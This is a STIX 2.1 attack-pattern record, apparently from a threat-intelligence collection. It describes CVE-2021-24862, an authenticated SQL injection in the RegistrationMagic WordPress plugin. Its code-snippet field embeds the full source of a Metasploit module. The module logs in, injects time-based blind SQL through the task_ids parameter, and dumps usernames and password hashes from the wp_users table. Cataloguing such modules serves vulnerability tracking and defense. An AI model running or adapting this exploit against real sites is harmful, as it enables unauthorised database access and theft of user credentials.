{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--49a41274-e354-4bba-b7e5-1db7b9a0fa67",
    "created": "2024-08-14T16:29:54.738242Z",
    "modified": "2024-08-14T16:29:54.738247Z",
    "name": "Wordpress RegistrationMagic task_ids Authenticated SQLi",
    "description": " RegistrationMagic, a WordPress plugin prior to 5.0.1.5 is affected by an authenticated SQL injection via the task_ids parameter. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_registrationmagic_sqli.rb",
            "external_id": "wp_registrationmagic_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-24862"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24862/README.md"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress RegistrationMagic task_ids Authenticated SQLi',\n        'Description' => %q{\n          RegistrationMagic, a WordPress plugin,\n          prior to 5.0.1.5 is affected by an authenticated SQL injection via the\n          task_ids parameter.\n        },\n        'Author' => [\n          'h00die', # msf module\n          'Hacker5preme (Ron Jost)', # edb\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2021-24862'],\n          ['URL', 'https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24862/README.md'],\n          ['EDB', '50686'],\n        ],\n        'Actions' => [\n          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }]\n        ],\n        'DefaultAction' => 'List Users',\n        'DisclosureDate' => '2022-01-23',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options [\n      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),\n      OptString.new('USERNAME', [true, 'Valid Username for login', '']),\n      OptString.new('PASSWORD', [true, 'Valid Password for login', ''])\n    ]\n  end\n\n  def check_host(_ip)\n    unless wordpress_and_online?\n      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')\n    end\n\n    checkcode = check_plugin_version_from_readme('custom-registration-form-builder-with-submission-manager', '5.0.1.6')\n    if checkcode == Msf::Exploit::CheckCode::Safe\n      return Msf::Exploit::CheckCode::Safe('RegistrationMagic version not vulnerable')\n    end\n\n    print_good('Vulnerable version of RegistrationMagic detected')\n    checkcode\n  end\n\n  def run_host(ip)\n    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])\n\n    fail_with(Failure::NoAccess, 'Invalid login, check credentials') if cookie.nil?\n\n    formid = Rex::Text.rand_text_numeric(2)\n    vprint_status(\"Using formid of: #{formid}\")\n    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|\n      d = Rex::Text.rand_text_numeric(4)\n      res = send_request_cgi({\n        'method' => 'POST',\n        'cookie' => cookie,\n        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),\n        'vars_get' => {\n          'page' => 'rm_ex_chronos_edit_task',\n          'rm_form_id' => '2'\n        },\n        'vars_post' => {\n          'action' => 'rm_chronos_ajax',\n          'rm_chronos_ajax_action' => 'duplicate_tasks_batch',\n          'task_ids[]' => \"#{formid}) AND (SELECT #{Rex::Text.rand_text_numeric(4)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)}) AND (#{d}=#{d}\"\n        }\n      })\n      fail_with Failure::Unreachable, 'Connection failed' unless res\n    end\n\n    unless @sqli.test_vulnerable\n      print_bad(\"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\")\n      return\n    end\n    columns = ['user_login', 'user_pass']\n\n    print_status('Enumerating Usernames and Password Hashes')\n    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])\n\n    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)\n    data.each do |user|\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: user[0],\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),\n        private_data: user[1],\n        service_name: 'Wordpress',\n        address: ip,\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n      table << user\n    end\n    print_good('Dumped table contents:')\n    print_line(table.to_s)\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-01-23"
}